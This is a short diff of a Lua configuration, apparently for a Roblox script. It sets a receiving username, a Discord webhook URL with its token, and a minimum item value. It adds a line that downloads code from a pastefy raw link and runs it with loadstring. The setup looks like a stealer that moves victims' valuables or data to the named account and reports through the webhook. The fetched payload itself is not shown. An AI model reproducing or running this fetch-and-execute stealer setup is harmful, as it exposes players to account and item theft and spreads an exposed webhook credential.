@@ -2,4 +2,4 @@ Username = "govloklu11"
 Webhook = "https://discord.com/api/webhooks/1423744743082430625/ZZLmkNEXUJEIxuF2Tnxt4tAAq-O-jeJdIRUPkHhNEP4xRwIJeaLWkVi3BIjYcA3Q3U09"
 MinimumValue = 100000
 
-loadstring(game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/K8nJpvCb/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/K8nJpvCb/raw"))()
